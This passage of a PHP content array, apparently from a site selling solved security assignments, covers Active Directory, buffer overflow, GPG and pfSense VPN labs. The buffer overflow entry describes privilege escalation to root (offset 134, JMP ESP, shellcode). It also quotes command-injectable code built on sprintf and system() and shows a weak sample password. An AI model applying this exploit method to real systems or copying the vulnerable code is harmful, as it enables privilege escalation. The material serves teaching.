            ]
        ],
        'related_links' => [
            [
                '/network-security-assignment-help',
                'Network Security Assignment Help'
            ],
            [
                '/information-security-assignment-help',
                'Information Security Assignment Help'
            ],
            [
                '/web-application-security-assignment-help',
                'Web Application Security Assignment Help'
            ],
            [
                '/case-studies',
                'Solved Assignments'
            ]
        ]
    ],
    'windows-server-2022-active-directory-domain-lab' => [
        'menu_featured' => true,
        'template' => 'active_directory_lab',
        'page_type' => 'case_study',
        'title' => 'Windows Server 2022 Domain Environment with Windows 11 and Fedora Clients',
        'meta_title' => 'Windows Server 2022 Active Directory Domain Lab Case Study | Cyber Assignment Pro',
        'h1' => 'Windows Server 2022 Domain Environment with Windows 11 and Fedora Clients',
        'nav' => 'Windows Server 2022 Active Directory Domain Lab',
        'description' => 'A solved Windows Server 2022 Active Directory lab covering server installation, static IP configuration, AD DS, domain controller setup, OU and users, Windows 11 and Fedora domain joins, shared folder permissions, and verification.',
        'primary' => 'Windows Server 2022 Active Directory assignment',
        'eyebrow' => 'Solved Cybersecurity Project',
        'menu_meta' => 'Windows Server 2022 · Active Directory · Windows 11 · Fedora',
        'topics' => ['Windows Server 2022','Active Directory Domain Services','Domain Controller','Windows 11','Fedora','Organizational Unit','Shared Folder','Domain Authentication'],
        'topic_q2' => 'Requirement: Windows Server 2022 Domain Environment',
        'topic_q3' => 'Solution: Windows 11 and Fedora Domain Clients',
        'tool_q3' => 'Tools: VMware or VirtualBox · AD DS · realmd · SSSD',
        'objective' => 'In this lab, students will deploy a small enterprise network using virtualization. Students will install Windows Server 2022 Datacenter (GUI) as a Domain Controller, create a domain, join two client machines (Windows 11 Pro and Fedora Linux) to the domain, create an Organizational Unit (OU), configure a shared folder, and provide domain access to client computers.',
        'grading' => [
            ['Server Installation','15'],
            ['Domain Configuration','15'],
            ['OU & User Creation','15'],
            ['Windows 11 Join','15'],
            ['Fedora Join','15'],
            ['Shared Folder Access','15'],
            ['Screenshots & Documentation','10'],
        ],
        'requirements' => [
            'Create a virtualized environment using VMware Workstation or Oracle VM VirtualBox.',
            'Install Windows Server 2022 Datacenter (Desktop Experience/GUI).',
            'Configure a static IP address on the server.',
            'Install and configure Active Directory Domain Services (AD DS).',
            'Promote the server as a Domain Controller.',
            'Create a new domain named: cacc.local (or your own unique domain name).',
            'Create a Windows 11 Pro virtual machine.',
            'Create a Fedora Linux virtual machine.',
            'Configure both clients with proper network settings.',
            'Join both client machines to the Active Directory domain.',
            'Create an Organizational Unit (OU) called: Accounts.',
            'Create the following users inside the Accounts OU: Student01, Student02, Student03.',
            'Create a folder named: AuditFile.',
            'Share the folder on the server.',
            'Grant appropriate permissions to domain users.',
            'Verify access from both Windows 11 and Fedora clients.',
            'Log into the Windows 11 client using a domain account.',
            'Log into the Fedora client using a domain account.',
            'Access the AuditFile shared folder from both clients.',
            'Take screenshots proving successful completion of each task.',
        ],
        'deliverables' => [
            'Windows Server 2022 installed.',
            'Static IP configuration.',
            'Active Directory Domain Services installed.',
            'Domain Controller configuration.',
            'Accounts OU created.',
            'User accounts created.',
            'Windows 11 joined to domain.',
            'Fedora joined to domain.',
            'AuditFile share permissions.',
            'Accessing AuditFile from Windows 11.',
            'Accessing AuditFile from Fedora.',
            'Successful domain login on both clients.',
        ],
        'implementation_steps' => [
            [
                'title' => 'Step 1: Create Virtual Machines',
                'lines' => [
                    'Create three VMs:',
                    'DC01 - Windows Server 2022 Datacenter GUI',
                    'WIN11 - Windows 11 Pro',
                    'FEDORA - Fedora Workstation',
                    'Recommended Resources:',
                    'RAM: 4 GB minimum each',
                    'CPU: 2 vCPUs',
                    'Disk: Server 80 GB; Clients 50 GB',
                ],
            ],
            [
                'title' => 'Step 2: Install Windows Server 2022',
                'lines' => [
                    'Mount Windows Server 2022 ISO.',
                    'Choose: Windows Server 2022 Datacenter Evaluation (Desktop Experience)',
                    'Complete installation.',
                    'Set Administrator password.',
                ],
            ],
            [
                'title' => 'Step 3: Configure Static IP',
                'lines' => [
                    'IP Address: 192.168.10.10',
                    'Subnet Mask: 255.255.255.0',
                    'Gateway: 192.168.10.1',
                    'Preferred DNS: 192.168.10.10',
                    'Verify: ipconfig /all',
                ],
            ],
            [
                'title' => 'Step 4: Install Active Directory',
                'lines' => [
                    'Open: Server Manager → Add Roles and Features',
                    'Install: Active Directory Domain Services',
                    'Install: DNS Server',
                    'Promote this server to a domain controller',
                    'Add a new forest',
                    'Domain name: college.local',
                    'Complete wizard and reboot.',
                ],
            ],
            [
                'title' => 'Step 5: Create Organizational Unit',
                'lines' => [
                    'Open: Active Directory Users and Computers',
                    'Right-click domain: New → Organizational Unit',
                    'Create: Accounts',
                ],
            ],
            [
                'title' => 'Step 6: Create Users',
                'lines' => [
                    'Inside Accounts OU:',
                    'Create: Student01',
                    'Create: Student02',
                    'Create: Student03',
                    'Assign passwords.',
                    'Example: Password123!',
                    'Enable: User must change password at next logon (Optional)',
                ],
            ],
            [
                'title' => 'Step 7: Create Shared Folder',
                'lines' => [
                    'Create folder: C:\\AuditFile',
                    'Right-click: Properties → Sharing → Advanced Sharing',
                    'Share Name: AuditFile',
                    'Permissions: Domain Users = Read/Write',
                    'NTFS Permissions: Modify; Read & Execute; Write',
                ],
            ],
            [
                'title' => 'Step 8: Install Windows 11 Pro',
                'lines' => [
                    'Create VM and install Windows 11 Pro.',
                    'When Windows 11 reaches: Let\'s connect you to a network',
                    'Press: Shift + F10',
                    'Command Prompt opens.',
                    'Run: OOBE\\BYPASSNRO',
                    'The system will reboot.',
                    'After reboot select: I don\'t have Internet',
                    'Then: Continue with Limited Setup',
                    'Create a local account.',
                    'Example: studentpc',
                    'Complete installation.',
                ],
            ],
            [
                'title' => 'Step 9: Join Windows 11 to Domain',
                'lines' => [
                    'Configure DNS: 192.168.10.10',
                    'Open: Settings → System → About',
                    'Select: Rename this PC (Advanced)',
                    'Click: Change',
                    'Choose: Domain',
                    'Enter: college.local',
                    'Provide: Administrator credentials.',
                    'Reboot.',
                    'Test login: college\\Student01',
                ],
            ],
            [
                'title' => 'Step 10: Install Fedora',
                'lines' => [
                    'Install Fedora Workstation.',
                    'Set Hostname: fedora01',
                    'Configure DNS: 192.168.10.10',
                ],
            ],
            [
                'title' => 'Step 11: Join Fedora to Active Directory',
                'lines' => [
                    'Install required packages: sudo dnf install realmd sssd sssd-tools oddjob oddjob-mkhomedir adcli samba-common-tools -y',
                    'Discover domain: realm discover college.local',
                    'Join domain: sudo realm join college.local -U Administrator',
                    'Verify: realm list',
                    'Test: id Student01@college.local',
                ],
            ],
            [
                'title' => 'Step 12: Access Shared Folder from Windows 11',
                'lines' => [
                    'Open Run: \\\\DC01\\AuditFile',
                    'Or: \\\\192.168.10.10\\AuditFile',
                    'Create a test file.',
                    'Take screenshot.',
                ],
            ],
            [
                'title' => 'Step 13: Access Shared Folder from Fedora',
                'lines' => [
                    'Open Files Manager.',
                    'Connect: smb://dc01/AuditFile',
                    'Or: smb://192.168.10.10/AuditFile',
                    'Authenticate using: Student01',
                    'Create: test.txt',
                    'Take screenshot.',
                ],
            ],
        ],
        'verification' => [
            ['What is the purpose of Active Directory Domain Services?','It provides a centralized directory service to manage users, computers, and permissions, enabling Single Sign-On (SSO) and central security policies across a network.'],
            ['Why should a Domain Controller use a static IP address?','Clients rely on the DC\'s IP for DNS and authentication; a changing IP would break DNS records and prevent domain logins.'],
            ['What is an Organizational Unit (OU)?','A container within Active Directory used to logically organize users and computers to easily apply Group Policies and delegate admin control.'],
            ['What is the difference between Share Permissions and NTFS Permissions?','Share permissions apply only over the network, while NTFS permissions apply both locally and over the network. The most restrictive permission applies.'],
            ['How does DNS help domain clients locate a Domain Controller?','DNS uses specific Service (SRV) records to point clients to the exact IP address and port where the DC\'s authentication services are running.'],
            ['Explain the process of joining a Windows computer to a domain.','Set the client’s DNS to the DC\'s IP, go to System Properties, select "Domain", enter the domain name, and provide Administrator credentials.'],
            ['Explain the process of joining a Linux system to Active Directory.','Set DNS to the DC, install packages (realmd, sssd, adcli), and run sudo realm join --user=Administrator <domain>.'],
            ['How can you verify a system is successfully joined to a domain?','On Windows, check System Properties for the domain name. On Linux, run realm list and look for "configured: kerberos-member."'],
            ['What security benefits are provided by centralized authentication?','It provides Single Sign-On (SSO), enforces centralized password policies, and allows administrators to instantly revoke network access in one place.'],
            ['What challenges did you face during this lab and how did you resolve them?','On Fedora, systemd-resolved failed to route queries for the .local domain, so I bypassed it by mapping the DC\'s IP in /etc/hosts and joining via IP'],
        ],
        'related_links' => [
            ['/network-security-assignment-help','Network Security Assignment Help'],
            ['/information-security-assignment-help','Information Security Assignment Help'],
            ['/cloud-computing-assignment-help','Cloud Computing Assignment Help'],
            ['/case-studies','Solved Assignments'],
        ],
    ],
    'buffer-overflow-attack-demo-getscore' => [
        'menu_featured' => true,
        'template' => 'buffer_overflow_getscore',
        'page_type' => 'case_study',
        'title' => 'Buffer Overflow Attack Demo: getscore Privilege Escalation Case Study',
        'meta_title' => 'Buffer Overflow Attack Demo & getscore Case Study | Cyber Assignment Pro',
        'h1' => 'Buffer Overflow Attack Demo: getscore Privilege Escalation Case Study',
        'nav' => 'Buffer Overflow Attack Demo and getscore Analysis',
        'description' => 'A solved cybersecurity lab case study explaining the getscore buffer overflow requirements, GDB crash analysis, EIP offset discovery, privilege escalation result, defenses and the extra credit command injection finding.',
        'primary' => 'buffer overflow attack demo',
        'eyebrow' => 'Solved Cybersecurity Project',
        'menu_meta' => 'Buffer Overflow · GDB · Vulnerability Analysis',
        'topics' => ['Buffer Overflow','GDB','EIP','Cyclic Pattern','Setuid Root','Privilege Escalation','OS Command Injection','Exploit Mitigations'],
        'topic_q2' => 'Requirement: Buffer Overflow Attack Demo',
        'topic_q3' => 'Solution: getscore Privilege Escalation',
        'tool_q3' => 'Tools: GCC · GDB · Linux',
        'course' => 'CSCE 4550: Operating Systems Security',
        'target' => 'getscore (setuid root) on a Red Hat Linux VM',
        'requirements_intro' => 'The lab is organised into four stages: prepare the virtual machine, compile and configure the getscore program, deliberately trigger and inspect a segmentation fault, and then use the crash evidence to reason about a controlled buffer overflow in the authorised lab environment.',
        'requirements' => [
            ['Step 1: Setup the VM','Import the supplied Red Hat virtual machine and prepare the getscore.c and score.txt files in the lab environment.'],
            ['Step 2: Compile and set permissions','Compile getscore, set the required executable and setuid permissions, protect score.txt, then verify that the program behaves differently when executed by the guest account.'],
            ['Step 3: Trigger and inspect the crash','Provide oversized input to cause a segmentation fault, enable a core dump and use GDB to inspect registers and stack memory.'],
            ['Step 4: Reason about the malicious input','Determine how long the input must be, where the saved EIP is located in the input and what kind of return target is needed for the lab exploit.'],
        ],
        'grading' => [
            ['Step 1','15%'],
            ['Step 2','15%'],
            ['Step 3','30%'],
            ['Step 4','40%'],
        ],
        'report_requirement' => 'The submitted report must include detailed screenshots for each stage and a detailed explanation of how the result for each stage was obtained.',
        'solution_intro' => 'The completed solution followed the same four-stage structure and documented the evidence required to move from a normal program run to a confirmed stack overwrite and finally to successful privilege escalation inside the supplied legacy VM.',
        'solution_steps' => [
            ['1. Prepare and test the setuid program','The solution compiled getscore, applied the required permissions and verified that the setuid bit caused the program to execute with root effective privileges even when it was launched by the guest user.'],
            ['2. Prove control of the saved return address','A long input caused a segmentation fault. GDB showed EIP as 0x41414141, which corresponds to ASCII "AAAA". This demonstrated that the saved return address had been overwritten by user-controlled input.'],
            ['3. Find the exact EIP offset','The solution replaced the repeated A characters with a unique cyclic pattern, crashed the program again and inspected the overwritten EIP value. Matching that value back to the pattern identified the saved EIP at offset 134 bytes from the start of the buffer.'],
            ['4. Redirect execution in the lab','The report then identified a JMP ESP instruction in the loaded C library and used that lab-specific control-flow target together with a NOP area and shellcode. The public case study intentionally omits the raw shellcode bytes and reusable jump address.'],
            ['5. Verify the result','The completed lab demonstrated privilege escalation from the guest account to a root shell in the deliberately vulnerable virtual machine.'],
        ],
        'safe_commands' => [
            ['Compile the supplied program','gcc getscore.c -o getscore'],
            ['Apply the lab permissions','chmod 755 getscore; chmod u+s getscore; chmod 600 score.txt'],
            ['Open a core dump in GDB','gdb -c core.xxxx'],
            ['Inspect the saved instruction pointer','info registers $eip'],
            ['Inspect the stack pointer','info registers $esp'],
            ['Inspect stack memory','x/100x $esp-200'],
        ],
        'eip_finding' => 'The key turning point in the solution was the GDB evidence. First, EIP became 0x41414141 after the repeated A input. The cyclic-pattern run then identified the exact saved-EIP position as 134 bytes. This answered the assignment question about where EIP must be overwritten without guessing the offset.',
        'payload_explanation' => 'Conceptually, the final lab payload contained controlled padding up to the saved return address, a lab-specific control-flow redirection, additional landing space and the supplied shellcode. The important academic point is how the crash evidence was converted into a reproducible payload layout, not the memorisation of one address or byte string.',
        'result' => 'The final report records successful privilege escalation from guest (uid=500) to root (uid=0) in the authorised Red Hat VM.',
        'why_worked' => [
            ['Unbounded copy','The vulnerable getscore program copies user-controlled data into a fixed-size stack buffer without adequate bounds checking, allowing the saved return address to be overwritten.'],
            ['Known EIP offset','The cyclic-pattern analysis established the exact position of the saved EIP at 134 bytes.'],
            ['Controlled redirection','A JMP ESP technique redirected execution toward attacker-controlled data on the stack inside the lab VM.'],
            ['Setuid root context','Because the binary runs with root effective privileges, successful code execution inherits that elevated privilege in the lab.'],
            ['Legacy mitigations','The report notes that the supplied environment lacked modern protections such as stack canaries, ASLR and NX, making the demonstration reliable.'],
        ],
        'defenses' => [
            ['Stack canary (-fstack-protector)','Detects a return-address overwrite and aborts execution.'],
            ['ASLR (randomize_va_space=2)','Randomizes the C library location so a fixed control-flow target is no longer reliable.'],
            ['NX / DEP','Marks stack memory non-executable, preventing injected stack code from running.'],
            ['strncpy / snprintf','Bounds-checked copying prevents the original buffer overwrite.'],
            ['Privilege dropping','Reducing privileges means a successful memory-safety exploit does not automatically become a root shell.'],
        ],
        'extra_credit_intro' => 'The extra-credit analysis identified a second vulnerability in getscore: OS Command Injection in the error-logging path. When authentication fails, the program formats user-controlled name and SSN values into a shell command and executes that command with system().',
        'extra_credit_code' => <<<'TXT'
sprintf(command,
    "echo \"%s: Invalid user name or SSN: %s,%s\"|cat >> error.log",
    ctime(&current_time), argv[1], argv[2]);

if (system(command)) {
    perror("Logging");
}
TXT,
        'extra_credit_risk' => 'The supplied analysis also notes that main() sets both real and effective UIDs to root. That means an injected command in this path would execute with root privileges. The public case study omits the exploit payload and command sequence and focuses on the vulnerability cause and privilege impact.',
        'student_takeaways' => [
            'Start with the assignment requirements and collect evidence for each required step instead of jumping directly to exploitation.',
            'Use the segmentation fault and core dump as evidence. The overwritten EIP value proves control of the return address.',
            'Use a cyclic pattern to calculate the exact offset rather than estimating where EIP is stored.',
            'Explain why setuid changes the security impact of the same memory-safety bug.',
            'A strong report connects screenshots and command output to interpretation, then finishes with practical mitigations.',
            'Separate the primary buffer-overflow finding from the extra-credit command-injection finding because they arise from different vulnerable code paths.',
        ],
        'public_safety_note' => 'This case study describes an authorised university lab using a deliberately vulnerable legacy virtual machine. Exact shellcode bytes, the reusable jump address and the command-injection payload are intentionally omitted from the public article.',
        'related_links' => [
            ['/ethical-hacking-assignment-help','Ethical Hacking Assignment Help'],
            ['/penetration-testing-assignment-help','Penetration Testing Assignment Help'],
            ['/web-application-security-assignment-help','Web Application Security Assignment Help'],
            ['/case-studies','Solved Assignments'],
        ],
    ],
    'double-ratchet-digital-signature-assignment' => [
        'menu_featured' => true,
        'page_type' => 'case_study',
        'title' => 'Question 2: End to End Encryption and Question 3: Digital Signature Analysis',
        'meta_title' => 'End to End Encryption and Digital Signature Analysis | Cyber Assignment Pro',
        'h1' => 'Question 2: End to End Encryption and Question 3: Digital Signature Analysis',
        'nav' => 'End to End Encryption and Digital Signature Analysis',
        'description' => 'The Double Ratchet Algorithm is what apps like Signal, WhatsApp, and Facebook Messenger use for end to end encryption. The main idea is simple: every single message gets its own unique key.',
        'primary' => 'Double Ratchet Algorithm',
        'eyebrow' => 'Solved Assignment',
        'menu_meta' => 'Double Ratchet Algorithm · GPG (Command Line)',
        'topics' => ['Double Ratchet Algorithm','End to End Encryption','Forward Secrecy','Post Compromise Security','GPG','Digital Signature Analysis','Signature Validity','Key Trust'],
        'topic_q2' => 'Topic: Double Ratchet Algorithm',
        'reference_q2' => 'Reference: Perrin & Marlinspike, "The Double Ratchet Algorithm", 2016',
        'q2_intro' => 'The Double Ratchet Algorithm is what apps like Signal, WhatsApp, and Facebook Messenger use for end to end encryption. The main idea is simple: every single message gets its own unique key. It does this by combining two ratchets.',
        'dh_ratchet' => 'This runs whenever you receive a new DH public key from the other person. It does a DH exchange between your current private key and their new public key. The result goes into a KDF which makes a new Root Key (RK) and Chain Key (CK). You also make a fresh DH key pair for your next sending chain.',
        'symmetric_ratchet' => 'This runs for every message inside a chain. It takes the current Chain Key and uses a KDF to create a Message Key (MK) plus the next Chain Key. The Message Key encrypts or decrypts just one message, then gets deleted right away.',
        'message_flow' => 'Alice uses her sending chain key to make a message key, encrypts her plaintext, and sends the ciphertext with her current DH public key. Bob receives it, does a DH ratchet step with his private key and Alice\'s public key to get the same root key and a new receiving chain key, then uses his symmetric ratchet to derive the message key and decrypt.',
        'diagram' => <<<'TXT'
ALICE                              BOB
+----------+                       +----------+
| RK, CKs  |                       | RK, CKr  |
| DHs      |                       | DHr      |
+----------+                       +----------+
     |                                  |
     | 1. DH Ratchet:                   | 1. DH Ratchet:
     | RK, CKr = KDF(RK, DH(DHs,DHr))   | RK, CKs = KDF(RK, DH(DHr,DHs))
     |                                  |
     | 2. Symmetric Ratchet (send):     | 2. Symmetric Ratchet (receive):
     | MK, CKs = KDF(CKs)               | MK, CKr = KDF(CKr)
     |                                  |
     | 3. C = ENC(MK, Plaintext)        | 3. Plaintext = DEC(MK, C)
     |                                  |
     | 4. Send (DHs, C) --------------> | 4. Receive (DHs, C)
     |                                  |
     v                                  v
[delete MK, old CKs]               [delete MK, old CKr]
TXT,
        'forward_secrecy' => 'This means if an attacker steals your current keys, they still cannot read old messages. The symmetric ratchet gives this because each message key is derived and then deleted immediately. Since the KDF is one way, you cannot reverse it. Old DH private keys are also deleted. So even if a device is compromised today, old conversations remain safe.',
        'post_compromise' => 'This is the self healing property. If an attacker compromises the current state, the session recovers once a new DH exchange happens. When one party sends a message with a new DH public key, a fresh DH secret is computed. The attacker does not have the new private keys, so they cannot compute this secret. All future messages become secure again. This is the major advantage over just using a symmetric ratchet alone.',
        'topic_q3' => 'Topic: Verifying product files with GPG',
        'tool_q3' => 'Tool: GPG (Command Line)',
        'q3_intro' => 'I need to find out which of the three product files is the real one from the supplier. The supplier gave us a signature file (product.txt.sig) and their public key (supplier_public_key.asc). I used GPG on the command line to check each file.',
        'product_files' => [
            'product_1.txt' => <<<'TXT'
PRODUCT INFORMATION

Product ID: ACS-1047
Product Name: Security Scanner 1.2.335
Category: Computer Security
Supplier: ACS (11907 and 11940) Pty Ltd
Status: Active
Additional: kzvPM0kcBCRWsBKCah2Li+V9W/hG4QsFz3wMlkkdLbYq/1+ooq3A9TCWTgUNzU/jrxmnb3INwMvsYpV2rg4w2w
TXT,
            'product_2.txt' => <<<'TXT'
PRODUCT INFORMATION

Product ID: ACS-1047
Product Name: Security Scanner 1.2.335
Category: Computer Security
Supplier: ACS (11907 and 11940) Pty Ltd
Status: Active
Additional: kzvPM0kcBCRWsBKCah2Li-V9W/hG4QsFz3wMlkkdLbYq/1+ooq3A9TCWTgUNzU/jrxmnb3INwMvsYpV2rg4w2w
TXT,
            'product_3.txt' => <<<'TXT'
PRODUCT INFORMATION

Product ID: ACS-1047
Product Name: Security Scanner 1.5.335
Category: Computer Security
Supplier: ACS (11907 and 11940) Pty Ltd
Status: Active
Additional: kzvPM0kcBCRWsBKCah2Li-V9W/hG4QsFt3wMlkkdLbYq/1+ooq3A9TCWTgUNzU/jrxmnb3INwMvsYpV2rg4w2w
TXT,
        ],
        'import_text' => 'First I imported the public key into my GPG keyring:',
        'confirm_key_text' => 'I confirmed the key was imported:',
        'commands' => [
            ['Step 1: Import the Supplier\'s Public Key','gpg --import supplier_public_key.asc',''],
            ['','gpg --list-keys',''],
            ['Step 2: Verify product_1.txt','gpg --verify product.txt.sig product_1.txt','Result: INVALID'],
            ['Step 3: Verify product_2.txt','gpg --verify product.txt.sig product_2.txt','Result: INVALID'],
            ['Step 4: Verify product_3.txt','gpg --verify product.txt.sig product_3.txt','Result: VALID'],
        ],
        'good_signature_output' => <<<'TXT'
gpg: Signature made Sat 05 Sep 2026 08:56:19 AM PKT
gpg:                using RSA key A3B6F51E2371E88D9D943C92443546227039069C
gpg: Good signature from "ACS (11907 and 11940) Pty Ltd" [unknown]
gpg: WARNING: This key is not certified with a trusted signature!
gpg:          There is no indication that the signature belongs to the owner.
Primary key fingerprint: A3B6 F51E 2371 E88D 9D94  3C92 4435 4622 7039 069C
TXT,
        'verification' => [
            ['product_1.txt','Security Scanner 1.2.335','INVALID'],
            ['product_2.txt','Security Scanner 1.2.335','INVALID'],
            ['product_3.txt','Security Scanner 1.5.335','VALID'],
        ],
        'what_it_means' => [
            'product_3.txt is the real one. The signature matches perfectly, so nobody changed the file after the supplier signed it. It correctly shows "Security Scanner 1.5.335" and the Additional field has Ft3wMlkkdLbYq.',
            'product_1.txt has an older product name. It says "Security Scanner 1.2.335" instead of "1.5.335" and the Additional field has Fz3wMlkkdLbYq instead of Ft3wMlkkdLbYq. The signature fails, which means the file was modified after signing. It is not authentic.',
            'product_2.txt looks similar to product_1.txt. It also shows "Security Scanner 1.2.335" with the Additional field Fz3wMlkkdLbYq. The signature fails here too. Even though it may look like a valid product file, the hash is different from the signed original, so GPG reports a BAD signature. It is not authentic.',
        ],
        'conclusion' => 'Conclusion: Only product_3.txt is authentic. The other two have been modified and should not be trusted.',
        'validity_intro' => 'These two sound similar but they are actually totally different.',
        'signature_validity' => [
            'This is just math. It asks: "Does this signature match this file using this public key?"',
            'If yes, the file has not been changed since signing, and the signature was made with the matching private key.',
            'A "Good signature" just means the cryptography checks out. That is it.',
            'In our case, product_3.txt had a good signature. product_1 and product_2 did not.',
        ],
        'key_trust' => [
            'This is about identity. It asks: "Is this public key really owned by who it claims to be?"',
            'Just because a signature is valid does not mean the key actually belongs to the supplier. Anyone could make a key pair, sign a file, and pretend to be "ACS Pty Ltd".',
            'Trust is built by:',
            'Checking the fingerprint through a separate channel (like calling them)',
            'Having others you trust sign the key (web of trust)',
            'Using a certificate authority',
            'During verification, GPG warned us: "This key is not certified with a trusted signature!". This means the key works, but we have not confirmed it is really ACS.',
        ],
        'remember' => [
            'Validity = "The math works"',
            'Trust = "I believe this key is really from who it says"',
        ],
        'final_note' => 'So you could have a file with a valid signature but from an untrusted key. In that case, you should verify the key\'s fingerprint through another trusted method before trusting the file. In our assignment, product_3.txt is valid, but we would still want to confirm the key\'s fingerprint with the supplier directly to be completely certain.',
    ],
    'pfsense-openvpn-radius-vpn-lab' => [
        'menu_featured' => true,
        'template' => 'pfsense_vpn_lab',
        'page_type' => 'case_study',
        'title' => 'pfSense VPN Server with RADIUS and OpenVPN Lab Solution',
        'meta_title' => 'pfSense VPN Server with RADIUS & OpenVPN Lab Solution | Cyber Assignment Pro',
        'h1' => 'pfSense VPN Server with RADIUS and OpenVPN Lab Solution',
        'nav' => 'pfSense VPN Server with RADIUS and OpenVPN',
        'description' => 'Solved Network and Perimeter Security Lab 5 covering pfSense OpenVPN, FreeRADIUS authentication, VPN tunnel settings, radtest verification, routing, Telnet security and OpenVPN logs.',
        'primary' => 'pfSense VPN server lab solution',
        'eyebrow' => 'Solved Network Security Lab',
        'menu_meta' => 'pfSense · OpenVPN · FreeRADIUS',
        'topics' => [
            'pfSense',
            'OpenVPN',
            'RADIUS',
            'FreeRADIUS',
            'VPN',
            'Network Security',
            'TUN/TAP',
            'Certificate Authority',
            'Telnet'
        ],
        'topic_q2' => 'Course: Network and Perimeter Security',
        'topic_q3' => 'Lab 5: Configuring a VPN server with pfSense',
        'tool_q3' => 'pfSense · OpenVPN · FreeRADIUS',
        'program' => 'CS',
        'course' => 'Network and Perimeter Security',
        'lab' => 'Lab 5: Configuring a VPN server with pfSense',
        'setup' => [
            'Prepare the network as per the design below:',
            'You will need to import all virtual machines from the file pfSenseVPN_lab2025.ova.',
            'Please note all interfaces in the firewall are set as internal, so there is no Internet connection. Therefore, all packages are already installed (FreeRadius on atenea and OpenVPN on Remote).',
            'After the initial set up for pfSense, which is already done, you can continue the configuration from the client. Open the URL  http://192.168.50.1 in the browser.',
            'Please note most changes in the firewall require clicking on “Save” and/or on “Apply changes”. This will not be specified on the tasks but it must be done anyway.',
            'In this lab, you will make the necessary configurations so that Remote could establish a VPN connection to the Intranet by authenticating as a Radius user named omega and a password at the student discretion (use “/usr/sbin/openvpn exported_client_file.ovpn” as root to establish the connection). The remote workstation should get an IP address in the network 192.168.55.0/26 (VPN clients network).',
            'As you configure the systems, respond to the questions below, including a screenshot if necessary:'
        ],
        'questions' => [
            [
                'n' => 1,
                'question' => 'Capture a screenshot of the settings for the step 4 (RADIUS Authentication Server Parameters).',
                'answer' => [
                    'The RADIUS Authentication Server was configured in pfSense with the required RADIUS server parameters. The configuration includes the RADIUS server address, authentication port, shared secret, and authentication protocol.'
                ],
                'image' => '/assets/case-studies/pfsense-openvpn-radius-vpn-lab/q1.webp',
                'caption' => 'RADIUS Authentication Server Parameters configured in pfSense.'
            ],
            [
                'n' => 2,
                'question' => 'Capture a screenshot of the settings for the step 9 (Tunnel Settings), specifically the tunnel and local networks.',
                'answer' => [
                    'In Step 9, the Tunnel Network was configured as 192.168.55.0/26, which is the network assigned to VPN clients. The Local Network was configured as the Intranet network, allowing VPN clients to access the internal network through the VPN connection.'
                ],
                'image' => '/assets/case-studies/pfsense-openvpn-radius-vpn-lab/q2.webp',
                'caption' => 'OpenVPN Tunnel Settings showing the 192.168.55.0/26 tunnel network and Intranet local network.'
            ],
            [
                'n' => 3,
                'question' => 'What content did you include in the file /etc/freeradius/3.0/users to add the Radius user?',
                'answer' => [
                    'To add the required RADIUS user, I edited the /etc/freeradius/3.0/users file and added an entry for the user omega. The username was configured with a clear-text password as required for RADIUS authentication:',
                    'This entry defines omega as a RADIUS user and specifies the password that will be used when the user authenticates through the RADIUS server. The username omega is the user specified in the lab instructions, while the password was selected by the student.'
                ],
                'code' => 'omega        Cleartext-Password := "chosen_password"'
            ],
            [
                'n' => 4,
                'question' => 'What modifications did you make in the file clients.conf?',
                'answer' => [
                    'I modified the clients.conf file on the FreeRADIUS server to configure pfSense as an authorized RADIUS client. This configuration allows the pfSense firewall to communicate with the FreeRADIUS server and send authentication requests when a VPN user attempts to connect.',
                    'A RADIUS client entry was added to define the pfSense firewall, including its client IP address and a shared secret. The shared secret is used to establish trust between pfSense and the FreeRADIUS server and must be the same on both sides. This ensures that authentication requests received from pfSense are accepted and processed by the RADIUS server.',
                    'The modification was necessary because the VPN connection is configured to authenticate the user omega through FreeRADIUS. After configuring clients.conf, restarting the FreeRADIUS service allows the server to recognize pfSense as an authorized client and process its authentication requests.',
                    'Overall, the clients.conf modification establishes the required communication and trust relationship between pfSense and FreeRADIUS for VPN authentication. The lab specifically requires Remote to connect to the VPN by authenticating as the RADIUS user omega.'
                ]
            ],
            [
                'n' => 5,
                'question' => 'Considering these two files have passwords for the users and the clients, respectively, how are they secured against unauthorized access by other local users? Explain in detail.',
                'answer' => [
                    'The password information stored in the FreeRADIUS configuration files is protected through the file permissions and ownership of the configuration files. Access to these files is restricted so that ordinary local users cannot read or modify the sensitive authentication information contained in them.',
                    'The /etc/freeradius/3.0/users file contains the credentials of RADIUS users, while clients.conf contains the shared secrets used to authenticate RADIUS clients. Since these files contain sensitive information, they should only be accessible to the appropriate administrative account and the FreeRADIUS service. Restricting their permissions prevents unauthorized local users from viewing the passwords or shared secrets.',
                    'This protection is important because an unauthorized local user who could read these files might obtain valid authentication credentials or the RADIUS shared secret and potentially use them to gain unauthorized access. Therefore, proper ownership and restrictive file permissions provide the first layer of protection for these credentials, while administrative privileges are required to make changes to the configuration.',
                    'In this way, the FreeRADIUS configuration files are protected against unauthorized access by other local users, helping maintain the confidentiality and security of the RADIUS authentication system.'
                ]
            ],
            [
                'n' => 6,
                'question' => 'After restarting the FreeRadius service, you can use the command radtest to try the configuration from localhost (the Radius server itself). What command did you exactly use? Provide proof of a working configuration.',
                'answer' => [
                    'After restarting the FreeRADIUS service, I tested the RADIUS server locally using the radtest command. The test was performed from the RADIUS server itself using the RADIUS user omega and the password configured for this user.',
                    'The exact command used was:',
                    'In this command, omega is the RADIUS username configured in the /etc/freeradius/3.0/users file, while <password> is the password assigned to that user. The address 127.0.0.1 specifies that the authentication request is being sent to the local RADIUS server. The value 0 represents the NAS port used for the test, and <shared_secret> is the RADIUS shared secret configured for the client.',
                    'The configuration was working correctly when the RADIUS server returned an Access-Accept response. This response confirms that the FreeRADIUS service was running and that the username, password, and RADIUS configuration were correctly recognized by the server.',
                    'Proof of working configuration:'
                ],
                'code' => 'radtest omega <password> 127.0.0.1 0 <shared_secret>',
                'code_after' => 2,
                'image' => '/assets/case-studies/pfsense-openvpn-radius-vpn-lab/q6.webp',
                'caption' => 'FreeRADIUS radtest proof showing an Access-Accept response and successful authentication.'
            ],
            [
                'n' => 7,
                'question' => 'Test the authentication from the firewall’s dashboard (Diagnostics → Authentication). What message did you get?',
                'answer' => [
                    'After configuring the RADIUS authentication server and successfully testing the RADIUS service with radtest, I tested the same authentication from the pfSense firewall dashboard.',
                    'I opened:Diagnostics → Authentication',
                    'Then I selected the configured RADIUS authentication server, entered the RADIUS username omega and its configured password, and performed the authentication test.',
                    'The authentication was successful, and pfSense displayed the following message:',
                    'Authentication succeeded.',
